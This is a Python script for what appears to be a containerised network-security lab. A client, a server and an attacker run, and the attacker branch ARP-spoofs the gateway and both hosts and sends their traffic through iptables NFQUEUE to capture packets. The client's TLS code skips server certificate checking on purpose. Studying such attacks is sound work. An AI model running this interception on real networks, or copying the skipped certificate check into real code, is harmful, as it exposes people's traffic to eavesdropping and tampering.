# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import socket
import subprocess
import http.client
from time import sleep

import netfilterqueue
import scapy.layers.inet
import tlslite
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker


TLS_VERSION = (3,2) # 3,2 For tls 1.1, 3,3 for tls 1.2, 3,4 for tls 1.3 (watchout, you might need ecdsa, might not work with rsa... it gives missing supported group error...)

def handler_queue_1(pkt: netfilterqueue.Packet):
    handler_queue_1.pktnum += 1
    print(f"{handler_queue_1.pktnum}) received " + pkt.__str__())
    # PDU = Packet data unit, IP header + IP content!
    # remember, IP packet may be fragmented, but we may be lucky and content may be all inside a single IP packet!
    l3_PDU = pkt.get_payload() # starts with the IP header, continues with the contents (matrioska, TCP is inside IP payload)
    scpy_pkt = IP(l3_PDU)


    if scpy_pkt.haslayer(scapy.layers.inet.TCP):
        print("TCP packet received")
        scpy_pkt.show2()
        if scpy_pkt.haslayer(TLSClientHello):
            # todo: check if payload contains a TCP packet, if yes check if it contains a TLS handshake message, if not accept anyway, if yes
            # as a test, drop each packet after printing it!
            None

        pkt.accept()
    else:
        pkt.accept()




# just a static variable inside the handler queue 1 function, to keep track of the number of packets received...
handler_queue_1.pktnum = 0

def check_internet_connection():
    conn = http.client.HTTPSConnection("8.8.8.8", timeout=5)
    try:
        conn.request("HEAD", "/")
        return "Connected to Internet!"
    except Exception:
        return "no connection!"
    finally:
        conn.close()

def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f"Hi, {name}, i'm {socket.gethostname()} and you can find me at {socket.gethostbyname(socket.gethostname())}")  # Press Ctrl+F8 to toggle the breakpoint.
    print("Public ip address: ", check_internet_connection())

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

    if socket.gethostname() == "client":
        # try to connect via tls to server after 10s...
        print("client connected...")
        p = subprocess.Popen(["ping", "172.18.0.3"])

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        sleep(5) # give some time to the server for setup, before trying to connect...
        #step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("172.18.0.3", 443))
        #step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(sock)
        #step 3. call a handshake function (client).
        #        We insert voluntarily a bug here, which is to not check the server's certificate, much like what happens with
        #        old router's control panels: they have https with tls, but their certificate is not installed in the machine.
        #        THe bug is to not insert a checker object in the list of arguments to handshakeclientcert.
        x509 = X509()
        with open("/app/client_certificate.pem") as s:
            x509.parse(s.read())
        chain = X509CertChain([x509])

        with open("/app/RSA_key_client_client.pem") as s:
            private_key = parsePEMKey(s.read(), private=True)

        with open("/app/server_certificate.pem") as s:
            server_certificate = X509().parse(s.read())

        print(server_certificate.sigalg)
        print(server_certificate)

        settings = HandshakeSettings()
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.maxVersion = TLS_VERSION
        settings.keyExchangeNames = ["rsa"]

        try:
            conn.handshakeClientCert(chain,
                                     private_key,
                                     settings=settings#,
                                     # checker= Checker(x509Fingerprint=server_certificate.getFingerprint())
                                     )  # we pass the client certificate and private key to the function, even if the server will not (initially, phase 1) ask for it.
            print("Handshake done")

            conn.sendall(b"Send 50 to Alice")
            sleep(5)

            oldSession = conn.session


        except Exception as e:
            print(e)
        finally:
            conn.close()

        p.kill()
    elif socket.gethostname() == "server":
        # listen to a socket...
        print("server connected...")

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        # step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # step 1s. bind the socket to our address (SERVER) and port, and start listening...
        sock.bind(("172.18.0.3", 443))
        sock.listen(1)
        real_sock, client_address = sock.accept() # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
        real_sock.settimeout(20)
        print(f"connected to {client_address}")


        # step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(real_sock)
        # step 3. call a handshake function (server).
        #        We insert voluntarily a bug here, which is to not check the client's certificate from the start
        s = open("/app/server_certificate.pem").read()
        x509 = X509()
        x509.parse(s)
        chain = X509CertChain([x509])

        s = open("/app/RSA_key_server_server.pem").read()
        private_key = parsePEMKey(s, private=True)


        with open("/app/client_certificate.pem") as s:
            client_certificate = X509().parse(s.read())

        settings = HandshakeSettings()
        settings.maxVersion = TLS_VERSION
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.keyExchangeNames = ["rsa"]

        # session cache active, so we can resume laster
        sessionCache = SessionCache()

        try:
            conn.handshakeServer(certChain=chain,
                                 privateKey=private_key,
                                 settings=settings,
                                 sessionCache=sessionCache,
                                 checker=Checker(client_certificate.getFingerprint()),
                                 reqCert=True)  # we pass the server certificate and private key to the function
            print("Handshake done")

            msg = conn.recv(1024)
            print(msg)


        except Exception as e:
            print(e)
        finally:
            conn.close()
            sock.close()


    else:

        print("attacker online...")
        with open("/dev/null", "wb") as fnull:
            # attacker
            # run arpspoof ASAP
            # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
            p = list()
            print("starting arpspoofing...")
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the server i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the client i'm the server
            # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
            print("arpspoofing started.")
            #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
            #In fact, iptables works at the TCP/IP level (layer 3 and 4), so even if frames (layer 2, ethernet) are directed to us
            # (and according to intuitition our chain of interest would be INPUT), they are still at layer 2!!!!!!
            # And so, IPTABLES, which starts to look into network packets ONLY at layer 3 (IP), THOSE PACKETS ARE NOT DIRECTED TO US AND SO DO NOT PERTAIN TO THE INPUT CHAIN.
            # why this comment? Well, to spare you some time debugging this code!

            print("creating iptables netfilter rules for victim and server...")
            # must capture every packet destined to the server coming from the client, ...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
            #and every packet destined to the client coming from the server...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
            # as they come, they will be ordered in the queue (remember, queues are FIFOs!)
            print("firewall rules created.")

            print("Binding netfilterqueue socket...")
            nfqueue = NetfilterQueue()
            nfqueue.bind(1, handler_queue_1)

            s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
            print("Binded.")

            print("Waiting for packets...")
            try:
                nfqueue.run_socket(s)
            except KeyboardInterrupt:
                print('')
            finally:
                s.close()
                nfqueue.unbind()

            for proc in p:
                proc.kill()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
